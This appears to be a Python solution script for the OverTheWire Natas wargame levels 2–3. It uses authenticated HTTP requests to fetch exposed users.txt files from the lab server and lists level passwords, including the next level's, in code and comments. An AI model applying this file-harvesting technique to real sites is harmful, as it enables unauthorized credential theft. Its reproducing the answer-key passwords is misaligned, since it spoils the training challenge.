#!/usr/bin/env python

import requests
import re

username = 'natas2'
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

def loginWebSite(): 
    siteUrl = 'http://{}.natas.labs.overthewire.org/files/users.txt'.format(username)
    content = requests.get(siteUrl, auth = (username, password))
    print(content.text)
    #print(re.findall('There is nothing on this page',content.text))
loginWebSite()

def loginNextchallenge():
    username='natas3'
    password='sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
    #nextChallengeUrl = 'http://natas3.natas.labs.overthewire.org/robots.txt'
    nextChallengeUrl = 'http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt'
    content = requests.get(nextChallengeUrl, auth = (username, password))
    print(content.text)

'''
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
'''
#loginWebSite()
loginNextchallenge()                #natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ